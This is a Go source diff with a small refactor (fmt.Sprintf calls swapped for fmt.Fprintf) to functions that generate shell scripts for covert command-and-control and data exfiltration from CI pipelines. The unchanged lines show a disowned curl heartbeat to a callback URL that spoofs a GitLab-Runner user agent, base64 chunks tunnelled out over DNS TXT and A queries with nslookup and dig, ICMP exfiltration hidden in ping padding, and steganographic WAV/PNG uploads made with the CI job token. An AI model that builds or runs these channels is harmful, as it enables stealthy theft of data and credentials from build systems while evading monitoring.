@@ -86,7 +86,7 @@ func buildC2ChannelScript(o C2ChannelOptions) string {
 		b.WriteString("    curl -sS -X POST \\\n")
 		b.WriteString("      -H \"User-Agent: GitLab-Runner/16.0\" \\\n")
 		b.WriteString("      -d '{\"heartbeat\": true}' \\\n")
-		b.WriteString(fmt.Sprintf("      \"%s\" >/dev/null 2>&1 || true\n", o.CallbackURL))
+		fmt.Fprintf(&b, "      \"%s\" >/dev/null 2>&1 || true\n", o.CallbackURL)
 		b.WriteString("    sleep 30\n")
 		b.WriteString("  done) &\n")
 		b.WriteString("  disown\n\n")
@@ -112,7 +112,7 @@ func buildDNSTXTChannel(b *strings.Builder, domain string) {
 	b.WriteString("  while [ ${#b64} -gt 0 ]; do\n")
 	b.WriteString("    chunk=$(printf '%.62s' \"$b64\")\n")
 	b.WriteString("    b64=${b64#\"$chunk\"}\n")
-	b.WriteString(fmt.Sprintf("    query=\"${i}.${chunk}.txt.%s\"\n", domain))
+	fmt.Fprintf(b, "    query=\"${i}.${chunk}.txt.%s\"\n", domain)
 	b.WriteString("    nslookup -querytype=TXT \"$query\" \"8.8.8.8\" >/dev/null 2>&1 &\n")
 	b.WriteString("    disown\n")
 	b.WriteString("    sleep 0.05\n")
@@ -132,7 +132,7 @@ func buildDNSAChannel(b *strings.Builder, domain string) {
 	b.WriteString("  while [ ${#b64} -gt 0 ]; do\n")
 	b.WriteString("    chunk=$(printf '%.62s' \"$b64\")\n")
 	b.WriteString("    b64=${b64#\"$chunk\"}\n")
-	b.WriteString(fmt.Sprintf("    subdomain=\"${i}.${chunk}.tun.%s\"\n", domain))
+	fmt.Fprintf(b, "    subdomain=\"${i}.${chunk}.tun.%s\"\n", domain)
 	b.WriteString("    dig +short \"$subdomain\" A >/dev/null 2>&1 &\n")
 	b.WriteString("    disown\n")
 	b.WriteString("    i=$((i + 1))\n")
@@ -173,7 +173,7 @@ func buildStegWAV(b *strings.Builder, target string) {
 	b.WriteString("  # Upload steg artifact\n")
 	b.WriteString("  curl -sS -X POST -H \"PRIVATE-TOKEN: $CI_JOB_TOKEN\" \\\n")
 	b.WriteString("    -F \"file=@$wav_file\" \\\n")
-	b.WriteString(fmt.Sprintf("    \"%s/api/v4/projects/%s/packages/generic/steg-wav/1.0\" >/dev/null 2>&1\n", target, "$(echo $CI_PROJECT_PATH | sed 's|/|%2F|g')"))
+	fmt.Fprintf(b, "    \"%s/api/v4/projects/%s/packages/generic/steg-wav/1.0\" >/dev/null 2>&1\n", target, "$(echo $CI_PROJECT_PATH | sed 's|/|%2F|g')")
 	b.WriteString("  echo \"[+] Steg WAV uploaded as artifact\"\n\n")
 }
 
@@ -191,7 +191,7 @@ func buildStegPNG(b *strings.Builder, target string) {
 	b.WriteString("  # Upload as artifact\n")
 	b.WriteString("  curl -sS -X POST -H \"PRIVATE-TOKEN: $CI_JOB_TOKEN\" \\\n")
 	b.WriteString("    -F \"file=@$png_file\" \\\n")
-	b.WriteString(fmt.Sprintf("    \"%s/api/v4/projects/%s/packages/generic/steg-png/1.0\" >/dev/null 2>&1\n", target, "$(echo $CI_PROJECT_PATH | sed 's|/|%2F|g')"))
+	fmt.Fprintf(b, "    \"%s/api/v4/projects/%s/packages/generic/steg-png/1.0\" >/dev/null 2>&1\n", target, "$(echo $CI_PROJECT_PATH | sed 's|/|%2F|g')")
 	b.WriteString("  echo \"[+] Steg PNG uploaded as artifact\"\n\n")
 }
 
@@ -207,7 +207,7 @@ func buildICMPChannel(b *strings.Builder, target string) {
 	b.WriteString("    chunk=$(printf '%.32s' \"$hex\")\n")
 	b.WriteString("    hex=${hex#\"$chunk\"}\n")
 	b.WriteString("    padded=$(printf '%-32s' \"$chunk\" | tr ' ' '0')\n")
-	b.WriteString(fmt.Sprintf("    ping -c 1 -s 32 -p \"$padded\" \"%s\" >/dev/null 2>&1 || true\n", target))
+	fmt.Fprintf(b, "    ping -c 1 -s 32 -p \"$padded\" \"%s\" >/dev/null 2>&1 || true\n", target)
 	b.WriteString("    sleep 0.02\n")
 	b.WriteString("    i=$((i + 1))\n")
 	b.WriteString("  done\n")
